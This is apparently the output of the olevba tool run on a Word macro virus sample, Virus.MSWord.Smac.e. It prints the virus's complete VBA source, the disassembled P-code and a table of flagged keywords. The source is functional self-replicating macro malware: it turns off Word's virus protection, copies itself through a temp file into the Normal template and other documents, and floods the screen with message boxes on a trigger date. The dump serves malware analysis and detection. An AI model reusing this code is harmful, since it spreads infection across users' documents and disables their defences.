olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Smac.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Smac.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO bdoc2.bas 
in file: ./Virus.MSWord.Smac.e - OLE stream: 'Macros/VBA/bdoc2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(I).Name = "bdoc2" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(I).Name = "bdoc2" Then ActivInstall = True
Next I
If ActivInstall = True And NormInstall = True Then GoTo Label_Exit
If ActivInstall = True And NormInstall = False Then Set Doc = ActiveDocument
If ActivInstall = False And NormInstall = True Then Set Doc = NormalTemplate
Doc.VBProject.VBComponents("bdoc2").Export ("c:\bdoc2.sys")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
Label_Exit:
Application.ScreenUpdating = True
Application.DisplayAlerts = wdAlertsAll
Application.EnableCancelKey = wdCancelInterrupt
End Sub
Sub AutoClose()
On Error Resume Next
DisplayAlerts = wdAlertsNone
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "bdoc2" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "bdoc2" Then ActiveInstall = True
Next I
If ActiveInstall = True And NormInstall = True Then GoTo Label_Exit
If ActiveInstall = True And NormInstall = False Then
NormalTemplate.VBProject.VBComponents.import ("c:\bdoc2.sys")
NormalTemplate.Save
Else
Dname = ActiveDocument.FullName
If Left$(Dname, 8) = "Document" Then GoTo Label_Exit
ActiveDocument.VBProject.VBComponents.import ("c:\bdoc2.sys")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
Label_Exit:
Kill ("c:\bdoc2.sys")
If Day(Now) = 2 And Month(Now) = 9 Then
For I = 1 To 1000000
msg = Chr(-11328) + Chr(-11082) + Chr(-19004) + Chr(-10333) + Chr(-18269) + Chr(32) + Chr(44) + Chr(32) + Chr(-13830) + Chr(-14123) + Chr(-16404) + Chr(-16170) + Chr(32) + Chr(33) + Chr(33) + Chr(33)
MsgBox msg, vbCritical
Next I
End If
End Sub

Public Sub AutoExec()
On Error Resume Next
Application.DisplayAlerts = wdAlertsNone
Application.ScreenUpdating = False
Options.VirusProtection = False
End Sub
Sub AutoExit()
On Error Resume Next
Kill ("c:\bdoc2.sys")
If Day(Now) = 13 Then MsgBox Chr(-12604) + Chr(-17154) + Chr(-18191) + Chr(-13635) + Chr(-19219) + Chr(-12557) + Chr(44) + Chr(-14357) + Chr(-11871) + Chr(-11325) + Chr(-19007) + Chr(-20250) + Chr(-14099) + Chr(-17154) + Chr(33) + Chr(80) + Chr(114) + Chr(101) + Chr(115) + Chr(115) + Chr(32) + Chr(79) + Chr(75) + Chr(32) + Chr(46), vbCritical
End Sub
Sub AutoNew()
On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
NormalTemplate.VBProject.VBComponents("bdoc2").Export ("c:\bdoc2.sys")
End Sub
Sub ToolsMacro()

End Sub
Sub FileTemplates()

End Sub
Sub ViewVBCode()

End Sub
Sub HelpWordPerfectHelp()

End Sub
Sub ToolsCustomize()

End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Smac.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/bdoc2 - 5418 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #5:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #6:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "bdoc2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstall 
' 	EndIf 
' Line #7:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #8:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #9:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "bdoc2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActivInstall 
' 	EndIf 
' Line #10:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #11:
' 	Ld ActivInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo Label_Exit 
' 	EndIf 
' Line #12:
' 	Ld ActivInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Doc 
' 	EndIf 
' Line #13:
' 	Ld ActivInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Doc 
' 	EndIf 
' Line #14:
' 	LitStr 0x000C "c:\bdoc2.sys"
' 	Paren 
' 	LitStr 0x0005 "bdoc2"
' 	Ld Doc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #15:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #16:
' 	Label Label_Exit 
' Line #17:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #18:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #19:
' 	Ld wdCancelInterrupt 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #20:
' 	EndSub 
' Line #21:
' 	FuncDefn (Sub AutoClose())
' Line #22:
' 	OnError (Resume Next) 
' Line #23:
' 	Ld wdAlertsNone 
' 	St DisplayAlerts 
' Line #24:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #25:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "bdoc2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstall 
' 	EndIf 
' Line #26:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #27:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #28:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "bdoc2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActiveInstall 
' 	EndIf 
' Line #29:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Ld ActiveInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo Label_Exit 
' 	EndIf 
' Line #31:
' 	Ld ActiveInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #32:
' 	LitStr 0x000C "c:\bdoc2.sys"
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #33:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #34:
' 	ElseBlock 
' Line #35:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St Dname 
' Line #36:
' 	Ld Dname 
' 	LitDI2 0x0008 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0008 "Document"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Label_Exit 
' 	EndIf 
' Line #37:
' 	LitStr 0x000C "c:\bdoc2.sys"
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #38:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Label Label_Exit 
' Line #41:
' 	LitStr 0x000C "c:\bdoc2.sys"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #42:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #43:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x4240 0x000F 
' 	For 
' Line #44:
' 	LitDI2 0x2C40 
' 	UMi 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x2B4A 
' 	UMi 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x4A3C 
' 	UMi 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x285D 
' 	UMi 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x475D 
' 	UMi 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x3606 
' 	UMi 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x372B 
' 	UMi 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x4014 
' 	UMi 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x3F2A 
' 	UMi 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St msg 
' Line #45:
' 	Ld msg 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #46:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndSub 
' Line #49:
' Line #50:
' 	FuncDefn (Public Sub AutoExec())
' Line #51:
' 	OnError (Resume Next) 
' Line #52:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #53:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #54:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #55:
' 	EndSub 
' Line #56:
' 	FuncDefn (Sub AutoExit())
' Line #57:
' 	OnError (Resume Next) 
' Line #58:
' 	LitStr 0x000C "c:\bdoc2.sys"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #59:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x313C 
' 	UMi 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x4302 
' 	UMi 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x470F 
' 	UMi 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x3543 
' 	UMi 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x4B13 
' 	UMi 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x310D 
' 	UMi 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x3815 
' 	UMi 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x2E5F 
' 	UMi 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x2C3D 
' 	UMi 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x4A3F 
' 	UMi 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x4F1A 
' 	UMi 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x3713 
' 	UMi 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x4302 
' 	UMi 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' 	EndIf 
' Line #60:
' 	EndSub 
' Line #61:
' 	FuncDefn (Sub AutoNew())
' Line #62:
' 	OnError (Resume Next) 
' Line #63:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #64:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #65:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #66:
' 	LitStr 0x000C "c:\bdoc2.sys"
' 	Paren 
' 	LitStr 0x0005 "bdoc2"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #67:
' 	EndSub 
' Line #68:
' 	FuncDefn (Sub ToolsMacro())
' Line #69:
' Line #70:
' 	EndSub 
' Line #71:
' 	FuncDefn (Sub FileTemplates())
' Line #72:
' Line #73:
' 	EndSub 
' Line #74:
' 	FuncDefn (Sub ViewVBCode())
' Line #75:
' Line #76:
' 	EndSub 
' Line #77:
' 	FuncDefn (Sub HelpWordPerfectHelp())
' Line #78:
' Line #79:
' 	EndSub 
' Line #80:
' 	FuncDefn (Sub ToolsCustomize())
' Line #81:
' Line #82:
' 	EndSub 
' Line #83:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

